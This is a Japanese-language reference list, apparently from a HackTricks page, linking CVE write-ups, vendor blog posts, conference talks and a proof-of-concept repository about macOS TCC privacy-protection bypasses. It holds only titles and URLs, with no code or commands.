- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Frameworkのbypass](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [偶発的および意図的なmacOS TCCユーザープライバシー保護のbypass](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass（報告原文）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [世界のどこにいるの、カルメン・サンディエゴ：macOSのLocation Servicesの悪用](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypassでiCloudからデータを盗む](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG環境変数）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - DYLD環境変数を許可するentitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [XCSSET malwareで発見されたzero-day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0:「Macで起きることはAppleのiCloudに残るのか?!」- Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [新たなmacOS脆弱性「powerdir」でユーザーデータへの不正アクセスが可能に](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [ホームディレクトリを変更してTCCをbypassする（CVE-2020-27937）](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [音楽を再生してTCCをbypassする（CVE-2020-29621）](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Firefoxを盗む方法](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - macOSでTelegramを使ってTCCをbypass](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Appleの脆弱性を解明：diskarbitrationdとstoragekitdの監査 Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic ClicksとCoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - OS Xで環境変数を設定する](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypassと権限昇格](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCCデータベースへのmountによるTCC bypass](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [macOSのプライバシー機構をbypassする20以上の方法](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [TCCへの圧勝 - macOSのプライバシー機構をbypassする新たな20以上の方法](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [SpotlightからApple Intelligenceへ — 0dayを悪用し、macOS AIを支えるデータを盗む](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
